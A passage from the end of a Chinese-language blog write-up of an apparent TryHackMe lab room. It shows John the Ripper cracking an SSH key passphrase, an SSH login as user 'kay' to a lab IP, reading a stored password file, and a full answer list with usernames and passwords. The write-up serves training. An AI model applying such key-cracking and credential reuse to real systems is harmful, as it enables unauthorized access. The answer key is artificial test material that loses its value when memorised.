</span></span><span class=line><span class=cl>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span><span class=line><span class=cl>beeswax          (idrsa)   
</span></span><span class=line><span class=cl>1g 0:00:00:00 DONE (2024-03-12 04:54) 50.00g/s 4137Kp/s 4137Kc/s 4137KC/s behlat..bammer
</span></span><span class=line><span class=cl>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed.
</span></span></code></pre></td></tr></table></div></div><p>成功破解出密码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>ssh -i id_rsa kay@10.10.82.249
</span></span></code></pre></td></tr></table></div></div><p>然后开始读取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>cat pass.bak
</span></span><span class=line><span class=cl>heresareallystrongpasswordthatfollowsthepasswordpolicy$$
</span></span></code></pre></td></tr></table></div></div><h2 id=answer>Answer</h2><ol><li>Deploy the machine and connect to our network</li><li>Find the services exposed by the machine</li><li>What is the name of the hidden directory on the web server(enter name without /)?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>development
</span></span></code></pre></td></tr></table></div></div><ol start=4><li>User brute-forcing to find the username & password</li><li>What is the username?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>Jan
</span></span></code></pre></td></tr></table></div></div><ol start=6><li>What is the password?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>armando
</span></span></code></pre></td></tr></table></div></div><ol start=7><li>What service do you use to access the server(answer in abbreviation in all caps)?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>ssh
</span></span></code></pre></td></tr></table></div></div><ol start=8><li>Enumerate the machine to find any vectors for privilege escalation</li><li>What is the name of the other user you found(all lower case)?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>kay
</span></span></code></pre></td></tr></table></div></div><ol start=10><li>If you have found another user, what can you do with this information?</li><li>What is the final password you obtain?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>heresareallystrongpasswordthatfollowsthepasswordpolicy$$
</span></span></code></pre></td></tr></table></div></div></section><div class=comments><script>const getTheme=window.localStorage&&window.localStorage.getItem("theme");let theme=getTheme==="dark"?"dark":"light",s=document.createElement("script");s.src="https://giscus.app/client.js",s.setAttribute("data-repo","Wh1teJ0ker/discussion"),s.setAttribute("data-repo-id","R_kgDOOTzcZA"),s.setAttribute("data-category","Announcements"),s.setAttribute("data-category-id","DIC_kwDOOTzcZM4CoxXV"),s.setAttribute("data-mapping","pathname"),s.setAttribute("data-strict","0"),s.setAttribute("data-reactions-enabled","1"),s.setAttribute("data-emit-metadata","0"),s.setAttribute("data-input-position","top"),s.setAttribute("data-theme",theme),s.setAttribute("data-lang","zh-CN"),s.setAttribute("data-loading","lazy"),s.setAttribute("crossorigin","anonymous"),s.setAttribute("async",""),document.querySelector("div.comments").innerHTML="",document.querySelector("div.comments").appendChild(s)</script></div><div class=paginator><a class=prev href=https://wh1tej0ker.github.io/post/2024-peak-geekmisc-1xtnfv.html><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966 5.98257 11.8297 5.98456 11.9753 6.05061 12.0063c1.00435.4716 2.8788 1.9201 3.89435 2.9937M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentcolor" stroke-linecap="round"/></svg>
<span>2024巅峰极客-Misc</span></a>
<a class=next href=https://wh1tej0ker.github.io/post/tryhackmeeasypickle-rick-1vlraf.html><span>Tryhackme-easy-Pickle Rick</span><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966 16.0174 11.8297 16.0154 11.9753 15.9494 12.0063 14.945 12.4779 13.0706 13.9264 12.055 15m3.5006-3.0333C13.1345 12.0608 8 12 6 11" stroke="currentcolor" stroke-linecap="round"/></svg></a></div></article></div><footer class=footer><p>&copy; 2025 <a href=https://wh1tej0ker.github.io/>Wh1teJ0kerのBlog</a>
Powered by
<a href=https://gohugo.io/ rel=noopener target=_blank>Hugo️️</a>
<a href=https://github.com/guangzhengli/hugo-theme-ladder rel=noopener target=_blank>Ladder</a>
️</p></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const s=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="Copy";function n(){t.innerHTML="Copied",setTimeout(()=>{t.innerHTML="Copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),n();return}const s=document.createRange();s.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(s);try{document.execCommand("copy"),n()}catch{}o.removeRange(s)}),e.parentNode.appendChild(t)})</script></main></body><script src=/main.min.cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e.js integrity="sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg==" crossorigin=anonymous defer></script></html>